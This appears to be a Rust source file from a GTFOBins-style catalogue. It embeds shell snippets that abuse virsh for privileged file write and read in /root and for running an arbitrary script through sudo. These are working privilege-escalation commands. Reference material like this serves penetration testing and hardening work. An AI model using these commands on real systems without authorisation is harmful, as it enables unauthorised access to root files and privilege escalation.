pub static BIN_NAME: &'static str = "virsh";
pub static FW_DESC: &'static str = "This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn’t exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.";
pub static FW_CODE: &'static str = r#"
    
    LFILE_DIR=/root
    LFILE_NAME=file_to_write

    echo 'data' > data_to_write

    TF=$(mktemp)
    cat > $TF <<EOF
    <volume type='file'>
      <name>y</name>
      <key>$LFILE_DIR/$LFILE_NAME</key>
      <source>
      </source>
      <capacity unit='bytes'>5</capacity>
      <allocation unit='bytes'>4096</allocation>
      <physical unit='bytes'>5</physical>
      <target>
        <path>$LFILE_DIR/$LFILE_NAME</path>
        <format type='raw'/>
        <permissions>
          <mode>0600</mode>
          <owner>0</owner>
          <group>0</group>
        </permissions>
      </target>
    </volume>
    EOF

    virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
    virsh -c qemu:///system vol-create --pool x --file $TF
    virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
    virsh -c qemu:///system pool-destroy x
"#;
pub static FR_DESC: &'static str =
    "This requires the user to be in the `libvirt` group to perform privileged file read.";
pub static FR_CODE: &'static str = r#"
    
    LFILE_DIR=/root
    LFILE_NAME=file_to_read

    SPATH=file_to_save

    virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
    virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
    virsh -c qemu:///system pool-destroy x
"#;
pub static SUDO_CODE: &'static str = r#"
    
    SCRIPT=script_to_run
    TF=$(mktemp)
    cat > $TF << EOF
    <domain type='kvm'>
      <name>x</name>
      <os>
        <type arch='x86_64'>hvm</type>
      </os>
      <memory unit='KiB'>1</memory>
      <devices>
        <interface type='ethernet'>
          <script path='$SCRIPT'/>
        </interface>
      </devices>
    </domain>
    EOF
    sudo virsh -c qemu:///system create $TF
    virsh -c qemu:///system destroy x
"#;
use crate::code::{Code, Tag};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
